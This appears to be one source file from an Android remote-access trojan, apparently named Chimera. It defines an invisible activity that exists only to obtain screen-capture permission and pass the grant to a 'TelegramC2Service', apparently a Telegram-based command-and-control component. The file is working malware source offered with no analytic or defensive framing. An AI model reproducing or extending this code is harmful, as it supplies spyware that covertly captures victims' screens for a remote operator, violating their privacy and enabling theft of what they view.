package com.chimera;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.widget.Toast;

public class ScreenshotActivity extends Activity {

    private static final int REQUEST_CODE_SCREENSHOT = 1337;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // This activity has no UI (it's transparent). Its only purpose is to request
        // the screenshot permission.
        try {
            MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mediaProjectionManager != null) {
                startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_CODE_SCREENSHOT);
            } else {
                throw new IllegalStateException("MediaProjectionManager is not available.");
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "ScreenshotActivity_Request", e);
            // If the request fails, inform the service so it knows the operation was cancelled.
            sendResultToService(Activity.RESULT_CANCELED, null);
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_SCREENSHOT) {
            // Pass the result data (whether permission was granted or denied) to the service.
            sendResultToService(resultCode, data);
        }
        // The activity's job is done, so it closes immediately.
        finish();
    }

    private void sendResultToService(int resultCode, Intent data) {
        Intent serviceIntent = new Intent(this, TelegramC2Service.class);
        serviceIntent.setAction("ACTION_SCREENSHOT_RESULT");
        serviceIntent.putExtra("resultCode", resultCode);
        // Put the original result intent as an extra
        if (data != null) {
            serviceIntent.putExtra("resultData", data);
        }
        startService(serviceIntent);
    }
}